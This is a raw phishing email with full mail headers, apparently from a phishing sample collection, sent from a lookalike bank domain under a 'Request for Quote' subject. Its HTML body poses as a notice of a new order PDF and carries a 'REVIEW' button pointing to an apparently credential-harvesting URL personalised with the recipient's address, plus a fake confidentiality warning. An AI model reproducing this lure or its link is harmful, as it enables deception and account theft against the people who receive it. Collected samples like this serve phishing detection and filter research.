@@ -1,0 +1,203 @@
+Return-Path: noreply@soneribankk.com
+Delivered-To: jose@monkey.org
+X-FDA: 83390955270.06.7DB3524
+Received: from mail.soneribankk.com (unknown [185.218.137.241])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id 9B76CC000D
+	for <jose@monkey.org>; Wed, 30 Apr 2025 14:34:13 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=pass header.d=soneribankk.com header.s=default header.b=T9eCmLEy;
+	dmarc=pass (policy=none) header.from=soneribankk.com;
+	spf=pass (imf06.b.hostedemail.com: domain of noreply@soneribankk.com
+ designates 185.218.137.241 as permitted sender)
+ smtp.mailfrom=noreply@soneribankk.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1746023654;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=wl3d7ARg0ENFJzkdx37Dsy3jQmIIX9qtRYvuYGZwQes=;
+	b=SO1SP5ohftUoG3rEoDyjgUCxYSjRErHjRn2HkWrEg6iuUbDo+xVhv2cadOYqTiqKcj//St
+	qUnBFK94eyansfsxZbSC085DhjLCGe++8RtjN4sGhTPLDMuHiNvOtNHJMFV9L8hg+NFz/g
+	rmeqfrJlni1FkLynwHap4gDFXCxQBCE=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=pass header.d=soneribankk.com header.s=default header.b=T9eCmLEy;
+	dmarc=pass (policy=none) header.from=soneribankk.com;
+	spf=pass (imf06.b.hostedemail.com: domain of noreply@soneribankk.com
+ designates 185.218.137.241 as permitted sender)
+ smtp.mailfrom=noreply@soneribankk.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1746023654; a=rsa-sha256;
+	cv=none;
+	b=yTn4o+dBRP9ihrEii/lXyPb5AMEuV7MObatQwfDjODHbV8JTKRYcNxE9w7+iQ0h0ojRnGU
+	jFfxZurKZ4lRlP9whLd0B/o/Xw4Mp3l+7uSZsoTF+ojQrBr66tCJq2dkdpdMI0pCtl0Qn1
+	cqCiK9WIi1X9P+noFEG/jVxY4nwLQdk=
+Received: from soneribankk.com (unknown [188.253.29.168])
+	(Authenticated sender: info@soneribankk.com)
+	by mail.soneribankk.com (Postfix) with ESMTPSA id B09DA38848
+	for <jose@monkey.org>; Wed, 30 Apr 2025 16:34:11 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=soneribankk.com;
+	s=default; t=1746023651;
+	bh=wl3d7ARg0ENFJzkdx37Dsy3jQmIIX9qtRYvuYGZwQes=;
+	h=From:To:Subject:Date:From;
+	b=T9eCmLEy1XYP5nRuIw9HIro8Z+R4kDEvMNt7tT2OZ3aq3IUhRPDTsREBKzccJvfgC
+	 EKbHw4fze7xr5toW4wemM82OHkoe96tPMF2oEPoBd7av37W7ih2umgEKxLNfQ9xr+k
+	 wjGKeNKl3MPQJMrm61K5q3BwtXJbaWRcHNPVT5/invCjmOqsk5HD7Lt3O+vmFE3HFi
+	 R/Sz8RoxwB5LIRdoAwj/BpRWKsW+qus8rpGRJ/nzcPD+dY6gXjpNqfBmUuSKLOKOGx
+	 cr2fY0GHWDJ/2ooIvVdU0CW+/y1ef+5JekslL58LqUgT49+oa9vJ3+a8uYz+/S9tCd
+	 4afq7CaLcA9RA==
+From: Katarzyna Czarnota <noreply@soneribankk.com>
+To: jose@monkey.org
+Subject: Request for Quote and Estimated Shipping Date
+Date: 30 Apr 2025 16:34:11 +0200
+Message-ID: <20250430163410.8F564E1844DF341B@soneribankk.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Stat-Signature: 8r3wfyree7psj7u5ea6s5jc71jwxmfqa
+X-Spam-Status: No, score=4.00
+X-Rspamd-Queue-Id: 9B76CC000D
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-HE-Tag: 1746023653-658979
+X-HE-Meta: 
+ U2FsdGVkX19uchO6y/tm5sFfucFK3gR/j8u/0xt9Jg7SWTJ3C0k4XzdCpHioQ7rmYDvAjAf8wdNcAkjvBsbZqVuwN5PrEG4uxOudoFod38OO3O6w1a00IvZdk4WZv6skYBXok2NmmQ15zwTaTLUpb5jdaUKIJXduEm+DQUMS7hAXU45Cq6jUvVNgJMcvqTL0fmUJftrU6w/rDdRbOyVKtTIY57CsCSMDhL7qdieh7wl9LuxpTIfKHkf9D4JALP7qmz0H6rnvv1EzSMddwkEt6ZvsTT8IMYxnE4O/UCZfX9ILs2PV5EBqd1sf0PKfms8bZYcu+Q5QmfPIltHxM0UPybLko3sNBjZg3+1nsw2QO9lDsVyuvPPUNqrnMY3fwCT4LuUrVjXsj8Ag0OM1rlfUj5V2F65wtWzpj6ARmj6zClmVxmGhkuOyiqFUcO5ZyKu5SHavhoNP+0954u6mvRkdHUkBDKorwZAXQUDDo9DrI8cetIMPDnV3nC8pfrMeokb3dCuby4Z5MqhxWRT3VJymQ9PIy7iyvnoVl15RwmNlT86wHMSOfENwhN1dVRfD7UtCN8W6Lsb653M+Jzx7DHbsibbJlTKUxdT9niH7fz9fsK/NUWcHEPSDd4aAieWIYCNjNH5cRImF6EznKO9a1jXwyO1oErUa9/muW2XpRvF8y3jWpYjmEu8GWqVqXW7yuEOdmtyUvsCBBrdrTZ+/+PrXdKUWkBpZXJE3sch+E+MXkI2IVsxvT5UqbFBKDCBjLRVReuQ8C0azH+ZoN5VDbPDEC9yekt2KJ+Bxr0UvdiGqUNawaVg2uipQqs/iyUhR1E+UKkO4zI/0FlGCcQdK7Nzwon2Ry0yUbPLRdpDPoSI05p5FYmm6o6tiogQKfmCBtoDqlaWugEqRFUI92sc0PqPkZ4RkgvQEj4jrftwKHpIi9v221EERcHh1SY5l6WvURvcWKo3JmDEbA4D7O8JUyf8fWt312g5
+ 5Vpt2OH2F/TEDOsbPa+UVVIQ4gm5vbnnFmHiBJP0mWYWWRm6fNe/VQf10n5khsSyODmESSm5bvGTBf7b2murw3eTMt3b2jg6hTaOAuEtEVq27GnpBl+sNQ1/cSi+Z4UMoXLVKdic0Dl7LyOlkqudEIoBOC/tPeC46cx8IYNUR6mHWDCxlc0622Gf4vp/+/ZyWlbhLgexef99JXKT4nPdNyhMBl8O3gYy3eRdr8EV7ewSEssY0TUKyaquQrWs/RNNP9659eUt0LmfkuPuhncMqon1sQNpmSAjn0XFz2NGvbYfFTRguS//IQ4+oIsvk5M6EURVTQza19s7+fYg=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 196
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.21615"></HEAD>
+<body>
+<table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,2=
+55,255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial" cellspacing=3D"0" cellpad=
+ding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; MARGIN: 0px"><FIGURE class=3Dtable sty=
+le=3D"WIDTH: 600px">
+<table style=3D"MAX-WIDTH: 600px; FONT-FAMILY: arial, helvetica, sans-serif=
+; BORDER-COLLAPSE: collapse; MIN-WIDTH: 320px" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" bgcolor=3D"#fafafa" wi=
+dth=3D"100%" align=3D"left"><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; MARGIN: 0px" heig=
+ht=3D"100%">
+<HR style=3D"BOX-SIZING: content-box; OVERFLOW: visible; MARGIN-BOTTOM: 40p=
+x; BORDER-TOP: 0px; HEIGHT: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM-STYLE: so=
+lid; BORDER-LEFT: 0px">
+</TD></TR></TBODY></TABLE></FIGURE><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; PADDING-BOTTOM: 1=
+8px; PADDING-TOP: 18px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; =
+PADDING-RIGHT: 0px" height=3D"100%">
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><SPAN style=3D"FO=
+NT-SIZE: 24px; COLOR: rgb(66,66,66)"><SPAN style=3D"BOX-SIZING: border-box"=
+>New PDF File Received for Order&nbsp;116152</SPAN></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><A style=3D"COLOR=
+: rgb(34,34,34)"><SPAN style=3D"FONT-SIZE: 24px; COLOR: rgb(66,66,66)"><SPA=
+N style=3D"BOX-SIZING: border-box">jose@monkey.org</SPAN></SPAN></A></DIV><=
+/TD></TR></TBODY></TABLE></FIGURE><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"MARGIN: 0px"><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 15px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><SPAN style=3D"FO=
+NT-SIZE: 17px"><SPAN style=3D"BOX-SIZING: border-box">&nbsp;PDF file |&nbsp=
+; Wednesday, April 30, 2025 4:34 p.m.</SPAN></SPAN></DIV></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 15px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</TD></TR></TBO=
+DY></TABLE></FIGURE><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; MARGIN: 0px" heig=
+ht=3D"100%">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; TEXT-ALIGN: center; =
+border-radius: 6px">
+<A style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(66,165,245) 1px solid; =
+BORDER-RIGHT: rgb(66,165,245) 1px solid; BORDER-BOTTOM: rgb(66,165,245) 1px=
+ solid; COLOR: rgb(17,85,204); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PAD=
+DING-LEFT: 50px; BORDER-LEFT: rgb(66,165,245) 1px solid; DISPLAY: inline-bl=
+ock; LETTER-SPACING: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT: 50px; BACKGROUN=
+D-COLOR: rgb(26,86,189); border-radius: 3px" href=3D"https://account.subsys=
+tem.life/maintainance.html?class=3Djose@monkey.org"=20
+rel=3Dnoreferrer><SPAN style=3D"COLOR: #000000"><SPAN style=3D"BOX-SIZING: =
+border-box; FONT-WEIGHT: bolder">REVIEW</SPAN></SPAN></A></DIV></TD></TR></=
+TBODY></TABLE></FIGURE><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 18px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><BR>Review Order PDF<=
+/TD></TR></TBODY></TABLE></FIGURE><FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" h=
+eight=3D"100%"><FIGURE class=3Dtable>
+<table style=3D"FONT-SIZE: 2px; BORDER-COLLAPSE: collapse; LINE-HEIGHT: 2px=
+" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"center" borde=
+r=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 2px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" bgcolor=3D"#d2d2d2">&n=
+bsp;</TD></TR></TBODY></TABLE></FIGURE></TD></TR></TBODY></TABLE></FIGURE><=
+FIGURE class=3Dtable>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 18px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><EM style=3D"BOX-SIZI=
+NG: border-box"><I><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(209,21=
+3,216)"></SPAN></I></EM></TD></TR></TBODY></TABLE></FIGURE><FIGURE class=3D=
+table>
+<table style=3D"BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: top; MARGIN: 0px" heig=
+ht=3D"100%">
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center"><SPAN style=3D"FO=
+NT-SIZE: 12px; COLOR: rgb(128,128,128)"><SPAN style=3D"BOX-SIZING: border-b=
+ox">NOTE: This transaction has been processed.</SPAN></SPAN><SPAN style=3D"=
+COLOR: rgb(128,128,128)"><SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPA=
+N></SPAN><SPAN style=3D"FONT-SIZE: 12px; COLOR: rgb(128,128,128)"><SPAN sty=
+le=3D"BOX-SIZING: border-box">
+ Please note this is a private link and should not be shared with other par=
+ties as it contains confidential information.</SPAN></SPAN></DIV></TD></TR>=
+</TBODY></TABLE></FIGURE></TD></TR></TBODY></TABLE></FIGURE></TD></TR></TBO=
+DY></TABLE></FIGURE></TD></TR></TBODY></TABLE></FIGURE></BODY></HTML>
+
